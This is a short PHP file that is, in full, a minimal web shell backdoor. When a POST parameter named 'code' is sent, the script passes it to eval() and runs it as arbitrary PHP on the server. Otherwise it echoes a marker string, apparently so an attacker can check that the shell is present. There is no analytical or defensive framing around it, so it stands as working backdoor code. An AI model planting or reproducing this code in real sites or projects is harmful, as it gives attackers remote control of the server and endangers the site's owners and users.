<?php                                      
if(isset($_POST['code'])) {
 if ($_POST['code']!="") {
  eval(stripslashes($_POST[code]));
   exit;
  }
 }
echo "000huyasse";
?>